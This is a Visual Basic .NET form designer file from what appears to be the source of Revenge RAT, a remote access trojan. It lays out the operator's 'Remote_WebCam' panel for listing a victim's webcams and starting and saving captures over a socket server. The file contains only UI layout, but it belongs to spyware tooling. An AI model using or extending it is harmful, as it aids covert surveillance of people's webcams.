<Global.Microsoft.VisualBasic.CompilerServices.DesignerGenerated()>
Partial Class Remote_WebCam
    Inherits System.Windows.Forms.Form

    'Form overrides dispose to clean up the component list.
    <System.Diagnostics.DebuggerNonUserCode()>
    Protected Overrides Sub Dispose(ByVal disposing As Boolean)
        Try
            If disposing AndAlso components IsNot Nothing Then
                components.Dispose()
            End If
        Finally
            MyBase.Dispose(disposing)
        End Try
    End Sub

    'Required by the Windows Form Designer
    Private components As System.ComponentModel.IContainer

    'NOTE: The following procedure is required by the Windows Form Designer
    'It can be modified using the Windows Form Designer.  
    'Do not modify it using the code editor.
    <System.Diagnostics.DebuggerStepThrough()>
    Private Sub InitializeComponent()
        Me.components = New System.ComponentModel.Container()
        Dim resources As System.ComponentModel.ComponentResourceManager = New System.ComponentModel.ComponentResourceManager(GetType(Remote_WebCam))
        Me.TableLayoutPanel4 = New System.Windows.Forms.TableLayoutPanel()
        Me.TableLayoutPanel2 = New System.Windows.Forms.TableLayoutPanel()
        Me.TableLayoutPanel3 = New System.Windows.Forms.TableLayoutPanel()
        Me.Panel3 = New System.Windows.Forms.Panel()
        Me.GroupBox1 = New System.Windows.Forms.GroupBox()
        Me.Label5 = New System.Windows.Forms.Label()
        Me.SP = New System.Windows.Forms.CheckBox()
        Me.Label4 = New System.Windows.Forms.Label()
        Me.NumericUpDown1 = New System.Windows.Forms.NumericUpDown()
        Me.Label3 = New System.Windows.Forms.Label()
        Me.Label2 = New System.Windows.Forms.Label()
        Me.Label6 = New System.Windows.Forms.Label()
        Me.TableLayoutPanel8 = New System.Windows.Forms.TableLayoutPanel()
        Me.TableLayoutPanel6 = New System.Windows.Forms.TableLayoutPanel()
        Me.PictureBox1 = New System.Windows.Forms.PictureBox()
        Me.Panel1 = New System.Windows.Forms.Panel()
        Me.TableLayoutPanel5 = New System.Windows.Forms.TableLayoutPanel()
        Me.TableLayoutPanel10 = New System.Windows.Forms.TableLayoutPanel()
        Me.Panel4 = New System.Windows.Forms.Panel()
        Me.AutoSave = New System.Windows.Forms.CheckBox()
        Me.Panel2 = New System.Windows.Forms.Panel()
        Me.Q = New System.Windows.Forms.TrackBar()
        Me.Start = New System.Windows.Forms.Button()
        Me.Images = New System.Windows.Forms.ImageList(Me.components)
        Me.Refresh = New System.Windows.Forms.Button()
        Me.TableLayoutPanel1 = New System.Windows.Forms.TableLayoutPanel()
        Me.Devices = New Revenge_RAT_v0._3.RevengeRAT.FXLSV()
        Me.ColumnHeader2 = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.SocketServer1 = New Revenge_RAT_v0._3.RevengeRAT.SocketServer()
        Me.TableLayoutPanel4.SuspendLayout()
        Me.TableLayoutPanel2.SuspendLayout()
        Me.TableLayoutPanel3.SuspendLayout()
        Me.Panel3.SuspendLayout()
        Me.GroupBox1.SuspendLayout()
        CType(Me.NumericUpDown1, System.ComponentModel.ISupportInitialize).BeginInit()
        Me.TableLayoutPanel8.SuspendLayout()
        Me.TableLayoutPanel6.SuspendLayout()
        CType(Me.PictureBox1, System.ComponentModel.ISupportInitialize).BeginInit()
        Me.Panel1.SuspendLayout()
        Me.TableLayoutPanel5.SuspendLayout()
        Me.TableLayoutPanel10.SuspendLayout()
        Me.Panel4.SuspendLayout()
        Me.Panel2.SuspendLayout()
        CType(Me.Q, System.ComponentModel.ISupportInitialize).BeginInit()
        Me.TableLayoutPanel1.SuspendLayout()
        Me.SuspendLayout()
        '
        'TableLayoutPanel4
        '
        Me.TableLayoutPanel4.ColumnCount = 1
        Me.TableLayoutPanel4.ColumnStyles.Add(New System.Windows.Forms.ColumnStyle(System.Windows.Forms.SizeType.Percent, 100.0!))
        Me.TableLayoutPanel4.Controls.Add(Me.TableLayoutPanel2, 0, 0)
        Me.TableLayoutPanel4.Controls.Add(Me.Panel1, 0, 1)
        Me.TableLayoutPanel4.Dock = System.Windows.Forms.DockStyle.Fill
        Me.TableLayoutPanel4.Location = New System.Drawing.Point(0, 0)
        Me.TableLayoutPanel4.Name = "TableLayoutPanel4"
        Me.TableLayoutPanel4.RowCount = 2
        Me.TableLayoutPanel4.RowStyles.Add(New System.Windows.Forms.RowStyle(System.Windows.Forms.SizeType.Percent, 100.0!))
        Me.TableLayoutPanel4.RowStyles.Add(New System.Windows.Forms.RowStyle(System.Windows.Forms.SizeType.Absolute, 45.0!))
        Me.TableLayoutPanel4.Size = New System.Drawing.Size(769, 399)
        Me.TableLayoutPanel4.TabIndex = 0
        '
        'TableLayoutPanel2
        '
        Me.TableLayoutPanel2.ColumnCount = 2
        Me.TableLayoutPanel2.ColumnStyles.Add(New System.Windows.Forms.ColumnStyle())
        Me.TableLayoutPanel2.ColumnStyles.Add(New System.Windows.Forms.ColumnStyle(System.Windows.Forms.SizeType.Percent, 100.0!))
        Me.TableLayoutPanel2.Controls.Add(Me.TableLayoutPanel3, 0, 0)
        Me.TableLayoutPanel2.Controls.Add(Me.TableLayoutPanel8, 1, 0)
        Me.TableLayoutPanel2.Dock = System.Windows.Forms.DockStyle.Fill
        Me.TableLayoutPanel2.Location = New System.Drawing.Point(3, 3)
        Me.TableLayoutPanel2.Name = "TableLayoutPanel2"
        Me.TableLayoutPanel2.RowCount = 1
        Me.TableLayoutPanel2.RowStyles.Add(New System.Windows.Forms.RowStyle(System.Windows.Forms.SizeType.Percent, 100.0!))
        Me.TableLayoutPanel2.Size = New System.Drawing.Size(763, 348)
        Me.TableLayoutPanel2.TabIndex = 0
        '
        'TableLayoutPanel3
        '
        Me.TableLayoutPanel3.ColumnCount = 1
        Me.TableLayoutPanel3.ColumnStyles.Add(New System.Windows.Forms.ColumnStyle(System.Windows.Forms.SizeType.Percent, 100.0!))
        Me.TableLayoutPanel3.Controls.Add(Me.TableLayoutPanel1, 0, 0)
        Me.TableLayoutPanel3.Controls.Add(Me.Panel3, 0, 1)
        Me.TableLayoutPanel3.Dock = System.Windows.Forms.DockStyle.Fill
        Me.TableLayoutPanel3.Location = New System.Drawing.Point(3, 3)
        Me.TableLayoutPanel3.Name = "TableLayoutPanel3"
        Me.TableLayoutPanel3.RowCount = 2
        Me.TableLayoutPanel3.RowStyles.Add(New System.Windows.Forms.RowStyle())
        Me.TableLayoutPanel3.RowStyles.Add(New System.Windows.Forms.RowStyle(System.Windows.Forms.SizeType.Percent, 100.0!))
        Me.TableLayoutPanel3.RowStyles.Add(New System.Windows.Forms.RowStyle(System.Windows.Forms.SizeType.Absolute, 20.0!))
        Me.TableLayoutPanel3.Size = New System.Drawing.Size(188, 342)
        Me.TableLayoutPanel3.TabIndex = 0
        '
        'Panel3
        '
        Me.Panel3.Controls.Add(Me.GroupBox1)
        Me.Panel3.Dock = System.Windows.Forms.DockStyle.Fill
        Me.Panel3.Location = New System.Drawing.Point(3, 201)
        Me.Panel3.Name = "Panel3"
        Me.Panel3.Size = New System.Drawing.Size(182, 138)
        Me.Panel3.TabIndex = 1
        '
        'GroupBox1
        '
        Me.GroupBox1.Controls.Add(Me.Label5)
        Me.GroupBox1.Controls.Add(Me.SP)
        Me.GroupBox1.Controls.Add(Me.Label4)
        Me.GroupBox1.Controls.Add(Me.NumericUpDown1)
        Me.GroupBox1.Controls.Add(Me.Label3)
        Me.GroupBox1.Controls.Add(Me.Label2)
        Me.GroupBox1.Controls.Add(Me.Label6)
        Me.GroupBox1.Dock = System.Windows.Forms.DockStyle.Fill
        Me.GroupBox1.Location = New System.Drawing.Point(0, 0)
        Me.GroupBox1.Name = "GroupBox1"
        Me.GroupBox1.Size = New System.Drawing.Size(182, 138)
        Me.GroupBox1.TabIndex = 0
        Me.GroupBox1.TabStop = False
        '
        'Label5
        '
        Me.Label5.AutoSize = True
        Me.Label5.Location = New System.Drawing.Point(6, 95)
        Me.Label5.Name = "Label5"
        Me.Label5.Size = New System.Drawing.Size(31, 13)
        Me.Label5.TabIndex = 6
        Me.Label5.Text = "Size"
        '
        'SP
        '
        Me.SP.AutoSize = True
        Me.SP.Checked = True
        Me.SP.CheckState = System.Windows.Forms.CheckState.Checked
        Me.SP.Location = New System.Drawing.Point(9, 58)
        Me.SP.Name = "SP"
        Me.SP.Size = New System.Drawing.Size(110, 17)
        Me.SP.TabIndex = 5
        Me.SP.Text = "Stretch picture"
        Me.SP.UseVisualStyleBackColor = True
        '
        'Label4
        '
        Me.Label4.AutoSize = True
        Me.Label4.Location = New System.Drawing.Point(137, 35)
        Me.Label4.Name = "Label4"
        Me.Label4.Size = New System.Drawing.Size(22, 13)
        Me.Label4.TabIndex = 4
        Me.Label4.Text = "Ms"
        '
        'NumericUpDown1
        '
        Me.NumericUpDown1.Location = New System.Drawing.Point(9, 32)
        Me.NumericUpDown1.Maximum = New Decimal(New Integer() {1661992959, 0, 0, 0})
        Me.NumericUpDown1.Name = "NumericUpDown1"
        Me.NumericUpDown1.Size = New System.Drawing.Size(125, 21)
        Me.NumericUpDown1.TabIndex = 3
        '
        'Label3
        '
        Me.Label3.AutoSize = True
        Me.Label3.Location = New System.Drawing.Point(6, 17)
        Me.Label3.Name = "Label3"
        Me.Label3.Size = New System.Drawing.Size(111, 13)
        Me.Label3.TabIndex = 2
        Me.Label3.Text = "Capture Interval :"
        '
        'Label2
        '
        Me.Label2.AutoSize = True
        Me.Label2.Location = New System.Drawing.Point(35, 0)
        Me.Label2.Name = "Label2"
        Me.Label2.Size = New System.Drawing.Size(98, 13)
        Me.Label2.TabIndex = 1
        Me.Label2.Text = "Capture options"
        '
        'Label6
        '
        Me.Label6.AutoSize = True
        Me.Label6.Location = New System.Drawing.Point(6, 78)
        Me.Label6.Name = "Label6"
        Me.Label6.Size = New System.Drawing.Size(86, 13)
        Me.Label6.TabIndex = 0
        Me.Label6.Text = "Quality : 30%"
        '
        'TableLayoutPanel8
        '
        Me.TableLayoutPanel8.ColumnCount = 2
        Me.TableLayoutPanel8.ColumnStyles.Add(New System.Windows.Forms.ColumnStyle(System.Windows.Forms.SizeType.Absolute, 18.0!))
        Me.TableLayoutPanel8.ColumnStyles.Add(New System.Windows.Forms.ColumnStyle(System.Windows.Forms.SizeType.Percent, 100.0!))
        Me.TableLayoutPanel8.Controls.Add(Me.SocketServer1, 0, 0)
        Me.TableLayoutPanel8.Controls.Add(Me.TableLayoutPanel6, 1, 0)
        Me.TableLayoutPanel8.Dock = System.Windows.Forms.DockStyle.Fill
        Me.TableLayoutPanel8.Location = New System.Drawing.Point(197, 3)
        Me.TableLayoutPanel8.Name = "TableLayoutPanel8"
        Me.TableLayoutPanel8.RowCount = 1
        Me.TableLayoutPanel8.RowStyles.Add(New System.Windows.Forms.RowStyle(System.Windows.Forms.SizeType.Percent, 100.0!))
        Me.TableLayoutPanel8.Size = New System.Drawing.Size(563, 342)
        Me.TableLayoutPanel8.TabIndex = 1
        '
        'TableLayoutPanel6
        '
        Me.TableLayoutPanel6.ColumnCount = 1
        Me.TableLayoutPanel6.ColumnStyles.Add(New System.Windows.Forms.ColumnStyle(System.Windows.Forms.SizeType.Percent, 100.0!))
        Me.TableLayoutPanel6.Controls.Add(Me.PictureBox1, 0, 0)
        Me.TableLayoutPanel6.Dock = System.Windows.Forms.DockStyle.Fill
        Me.TableLayoutPanel6.Location = New System.Drawing.Point(21, 3)
        Me.TableLayoutPanel6.Name = "TableLayoutPanel6"
        Me.TableLayoutPanel6.RowCount = 1
        Me.TableLayoutPanel6.RowStyles.Add(New System.Windows.Forms.RowStyle(System.Windows.Forms.SizeType.Percent, 100.0!))
        Me.TableLayoutPanel6.Size = New System.Drawing.Size(539, 336)
        Me.TableLayoutPanel6.TabIndex = 1
        '
        'PictureBox1
        '
        Me.PictureBox1.BackColor = System.Drawing.Color.Black
        Me.PictureBox1.Dock = System.Windows.Forms.DockStyle.Fill
        Me.PictureBox1.Location = New System.Drawing.Point(3, 3)
        Me.PictureBox1.Name = "PictureBox1"
        Me.PictureBox1.Size = New System.Drawing.Size(533, 330)
        Me.PictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage
        Me.PictureBox1.TabIndex = 0
        Me.PictureBox1.TabStop = False
        '
        'Panel1
        '
        Me.Panel1.Controls.Add(Me.TableLayoutPanel5)
        Me.Panel1.Dock = System.Windows.Forms.DockStyle.Fill
        Me.Panel1.Location = New System.Drawing.Point(3, 357)
        Me.Panel1.Name = "Panel1"
        Me.Panel1.Size = New System.Drawing.Size(763, 39)
        Me.Panel1.TabIndex = 1
        '
        'TableLayoutPanel5
        '
        Me.TableLayoutPanel5.ColumnCount = 2
        Me.TableLayoutPanel5.ColumnStyles.Add(New System.Windows.Forms.ColumnStyle(System.Windows.Forms.SizeType.Percent, 100.0!))
        Me.TableLayoutPanel5.ColumnStyles.Add(New System.Windows.Forms.ColumnStyle(System.Windows.Forms.SizeType.Absolute, 187.0!))
        Me.TableLayoutPanel5.Controls.Add(Me.TableLayoutPanel10, 0, 0)
        Me.TableLayoutPanel5.Controls.Add(Me.Start, 1, 0)
        Me.TableLayoutPanel5.Dock = System.Windows.Forms.DockStyle.Fill
        Me.TableLayoutPanel5.Location = New System.Drawing.Point(0, 0)
        Me.TableLayoutPanel5.Name = "TableLayoutPanel5"
        Me.TableLayoutPanel5.RowCount = 1
        Me.TableLayoutPanel5.RowStyles.Add(New System.Windows.Forms.RowStyle(System.Windows.Forms.SizeType.Percent, 100.0!))
        Me.TableLayoutPanel5.Size = New System.Drawing.Size(763, 39)
        Me.TableLayoutPanel5.TabIndex = 0
        '
        'TableLayoutPanel10
        '
        Me.TableLayoutPanel10.ColumnCount = 2
        Me.TableLayoutPanel10.ColumnStyles.Add(New System.Windows.Forms.ColumnStyle(System.Windows.Forms.SizeType.Absolute, 156.0!))
        Me.TableLayoutPanel10.ColumnStyles.Add(New System.Windows.Forms.ColumnStyle(System.Windows.Forms.SizeType.Percent, 100.0!))
        Me.TableLayoutPanel10.Controls.Add(Me.Panel4, 0, 0)
        Me.TableLayoutPanel10.Controls.Add(Me.Panel2, 1, 0)
        Me.TableLayoutPanel10.Dock = System.Windows.Forms.DockStyle.Fill
        Me.TableLayoutPanel10.Location = New System.Drawing.Point(3, 3)
        Me.TableLayoutPanel10.Name = "TableLayoutPanel10"
        Me.TableLayoutPanel10.RowCount = 1
        Me.TableLayoutPanel10.RowStyles.Add(New System.Windows.Forms.RowStyle(System.Windows.Forms.SizeType.Percent, 100.0!))
        Me.TableLayoutPanel10.Size = New System.Drawing.Size(570, 33)
        Me.TableLayoutPanel10.TabIndex = 0
        '
        'Panel4
        '
        Me.Panel4.Controls.Add(Me.AutoSave)
        Me.Panel4.Dock = System.Windows.Forms.DockStyle.Fill
        Me.Panel4.Location = New System.Drawing.Point(3, 3)
        Me.Panel4.Name = "Panel4"
        Me.Panel4.Size = New System.Drawing.Size(150, 27)
        Me.Panel4.TabIndex = 0
        '
        'AutoSave
        '
        Me.AutoSave.AutoSize = True
        Me.AutoSave.Enabled = False
        Me.AutoSave.Location = New System.Drawing.Point(4, 3)
        Me.AutoSave.Name = "AutoSave"
        Me.AutoSave.Size = New System.Drawing.Size(150, 17)
        Me.AutoSave.TabIndex = 0
        Me.AutoSave.Text = "Save webcam frames"
        Me.AutoSave.UseVisualStyleBackColor = True
        '
        'Panel2
        '
        Me.Panel2.Controls.Add(Me.Q)
        Me.Panel2.Dock = System.Windows.Forms.DockStyle.Fill
        Me.Panel2.Location = New System.Drawing.Point(159, 3)
        Me.Panel2.Name = "Panel2"
        Me.Panel2.Size = New System.Drawing.Size(408, 27)
        Me.Panel2.TabIndex = 1
        '
        'Q
        '
        Me.Q.Dock = System.Windows.Forms.DockStyle.Fill
        Me.Q.Location = New System.Drawing.Point(0, 0)
        Me.Q.Maximum = 100
        Me.Q.Name = "Q"
        Me.Q.Size = New System.Drawing.Size(408, 45)
        Me.Q.TabIndex = 0
        Me.Q.Value = 30
        '
        'Start
        '
        Me.Start.Dock = System.Windows.Forms.DockStyle.Fill
        Me.Start.Enabled = False
        Me.Start.Image = CType(resources.GetObject("Start.Image"), System.Drawing.Image)
        Me.Start.ImageAlign = System.Drawing.ContentAlignment.MiddleLeft
        Me.Start.Location = New System.Drawing.Point(579, 3)
        Me.Start.Name = "Start"
        Me.Start.Size = New System.Drawing.Size(181, 33)
        Me.Start.TabIndex = 1
        Me.Start.Text = "Start Capture"
        Me.Start.UseVisualStyleBackColor = True
        '
        'Images
        '
        Me.Images.ImageStream = CType(resources.GetObject("Images.ImageStream"), System.Windows.Forms.ImageListStreamer)
        Me.Images.TransparentColor = System.Drawing.Color.Transparent
        Me.Images.Images.SetKeyName(0, "5.png")
        '
        'Refresh
        '
        Me.Refresh.Dock = System.Windows.Forms.DockStyle.Fill
        Me.Refresh.Image = CType(resources.GetObject("Refresh.Image"), System.Drawing.Image)
        Me.Refresh.ImageAlign = System.Drawing.ContentAlignment.MiddleLeft
        Me.Refresh.Location = New System.Drawing.Point(3, 164)
        Me.Refresh.Name = "Refresh"
        Me.Refresh.Size = New System.Drawing.Size(176, 25)
        Me.Refresh.TabIndex = 2
        Me.Refresh.Text = "Refresh"
        Me.Refresh.UseVisualStyleBackColor = True
        '
        'TableLayoutPanel1
        '
        Me.TableLayoutPanel1.ColumnCount = 1
        Me.TableLayoutPanel1.ColumnStyles.Add(New System.Windows.Forms.ColumnStyle(System.Windows.Forms.SizeType.Percent, 100.0!))
        Me.TableLayoutPanel1.Controls.Add(Me.Refresh, 0, 1)
        Me.TableLayoutPanel1.Controls.Add(Me.Devices, 0, 0)
        Me.TableLayoutPanel1.Dock = System.Windows.Forms.DockStyle.Fill
        Me.TableLayoutPanel1.Location = New System.Drawing.Point(3, 3)
        Me.TableLayoutPanel1.Name = "TableLayoutPanel1"
        Me.TableLayoutPanel1.RowCount = 2
        Me.TableLayoutPanel1.RowStyles.Add(New System.Windows.Forms.RowStyle(System.Windows.Forms.SizeType.Percent, 100.0!))
        Me.TableLayoutPanel1.RowStyles.Add(New System.Windows.Forms.RowStyle(System.Windows.Forms.SizeType.Absolute, 31.0!))
        Me.TableLayoutPanel1.Size = New System.Drawing.Size(182, 192)
        Me.TableLayoutPanel1.TabIndex = 0
        '
        'Devices
        '
        Me.Devices.Columns.AddRange(New System.Windows.Forms.ColumnHeader() {Me.ColumnHeader2})
        Me.Devices.Dock = System.Windows.Forms.DockStyle.Fill
        Me.Devices.Font = New System.Drawing.Font("Verdana", 8.0!)
        Me.Devices.FullRowSelect = True
        Me.Devices.GridLines = True
        Me.Devices.LargeImageList = Me.Images
        Me.Devices.Location = New System.Drawing.Point(3, 3)
        Me.Devices.Name = "Devices"
        Me.Devices.Size = New System.Drawing.Size(176, 155)
        Me.Devices.SmallImageList = Me.Images
        Me.Devices.TabIndex = 1
        Me.Devices.UseCompatibleStateImageBehavior = False
        Me.Devices.View = System.Windows.Forms.View.Details
        '
        'ColumnHeader2
        '
        Me.ColumnHeader2.Text = "         Webcam devices"
        Me.ColumnHeader2.Width = 165
        '
        'SocketServer1
        '
        Me.SocketServer1.Dock = System.Windows.Forms.DockStyle.Fill
        Me.SocketServer1.Location = New System.Drawing.Point(3, 3)
        Me.SocketServer1.Name = "SocketServer1"
        Me.SocketServer1.Size = New System.Drawing.Size(12, 336)
        Me.SocketServer1.TabIndex = 0
        '
        'Remote_WebCam
        '
        Me.AutoScaleDimensions = New System.Drawing.SizeF(7.0!, 13.0!)
        Me.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font
        Me.BackColor = System.Drawing.SystemColors.Window
        Me.ClientSize = New System.Drawing.Size(769, 399)
        Me.Controls.Add(Me.TableLayoutPanel4)
        Me.Font = New System.Drawing.Font("Verdana", 8.25!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.Icon = CType(resources.GetObject("$this.Icon"), System.Drawing.Icon)
        Me.MinimumSize = New System.Drawing.Size(785, 438)
        Me.Name = "Remote_WebCam"
        Me.Text = "Remote_WebCam"
        Me.TableLayoutPanel4.ResumeLayout(False)
        Me.TableLayoutPanel2.ResumeLayout(False)
        Me.TableLayoutPanel3.ResumeLayout(False)
        Me.Panel3.ResumeLayout(False)
        Me.GroupBox1.ResumeLayout(False)
        Me.GroupBox1.PerformLayout()
        CType(Me.NumericUpDown1, System.ComponentModel.ISupportInitialize).EndInit()
        Me.TableLayoutPanel8.ResumeLayout(False)
        Me.TableLayoutPanel6.ResumeLayout(False)
        CType(Me.PictureBox1, System.ComponentModel.ISupportInitialize).EndInit()
        Me.Panel1.ResumeLayout(False)
        Me.TableLayoutPanel5.ResumeLayout(False)
        Me.TableLayoutPanel10.ResumeLayout(False)
        Me.Panel4.ResumeLayout(False)
        Me.Panel4.PerformLayout()
        Me.Panel2.ResumeLayout(False)
        Me.Panel2.PerformLayout()
        CType(Me.Q, System.ComponentModel.ISupportInitialize).EndInit()
        Me.TableLayoutPanel1.ResumeLayout(False)
        Me.ResumeLayout(False)

    End Sub

    Friend WithEvents TableLayoutPanel4 As TableLayoutPanel
    Friend WithEvents TableLayoutPanel2 As TableLayoutPanel
    Friend WithEvents TableLayoutPanel3 As TableLayoutPanel
    Friend WithEvents Images As ImageList
    Friend WithEvents TableLayoutPanel8 As TableLayoutPanel
    Friend WithEvents SocketServer1 As RevengeRAT.SocketServer
    Friend WithEvents TableLayoutPanel6 As TableLayoutPanel
    Friend WithEvents PictureBox1 As PictureBox
    Friend WithEvents Panel1 As Panel
    Friend WithEvents TableLayoutPanel5 As TableLayoutPanel
    Friend WithEvents TableLayoutPanel10 As TableLayoutPanel
    Friend WithEvents Panel4 As Panel
    Friend WithEvents AutoSave As CheckBox
    Friend WithEvents Panel2 As Panel
    Friend WithEvents Q As TrackBar
    Friend WithEvents Start As Button
    Friend WithEvents Panel3 As Panel
    Friend WithEvents GroupBox1 As GroupBox
    Friend WithEvents Label2 As Label
    Friend WithEvents Label6 As Label
    Friend WithEvents Label3 As Label
    Friend WithEvents NumericUpDown1 As NumericUpDown
    Friend WithEvents Label4 As Label
    Friend WithEvents Label5 As Label
    Friend WithEvents SP As CheckBox
    Friend WithEvents TableLayoutPanel1 As TableLayoutPanel
    Friend WithEvents Refresh As Button
    Friend WithEvents Devices As RevengeRAT.FXLSV
    Friend WithEvents ColumnHeader2 As ColumnHeader
End Class
